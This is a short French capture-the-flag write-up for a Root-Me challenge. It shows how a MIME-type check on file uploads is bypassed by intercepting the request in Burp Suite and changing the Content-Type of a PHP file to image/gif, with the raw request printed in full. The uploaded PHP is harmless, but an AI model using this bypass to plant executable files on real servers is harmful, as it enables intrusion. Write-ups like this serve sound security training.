# File upload - type MIME

La page de [challenge](http://challenge01.root-me.org/web-serveur/ch21/?action=upload)

## Attaque

J'utilise **Burp Suite** pour intercepter mes requêtes http. Je fais bien attention de laisser l'option _intercept_ de _Proxy_ en _on_.

Je créer le fichier _file.php_, que j'upload depuis la page du challenge. Cette requête seras intercepter par Burp.
```
<?php
echo 0;
?>
```

Depuis mon interface Burp, j'analyse la requête interceptée. Je remarque le champ `Content-Type:application/x-php`.

```
POST /web-serveur/ch21/?action=upload HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.7,en-US;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
Cookie: PHPSESSID=...
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------7227795332295222081052113690
Content-Length: 240

-----------------------------7227795332295222081052113690
Content-Disposition: form-data; name="file"; filename="file.php"
Content-Type: application/x-php

<?php
echo 0;
?>

-----------------------------7227795332295222081052113690--
```

Je change `Content-Type: application/x-php` en `Content-type: image/gif` puis je forward la requête. De retour sur mon navigateur, le fichier a bien été uploadé. EN cliquant dessus, je retrouve le flag de challenge.
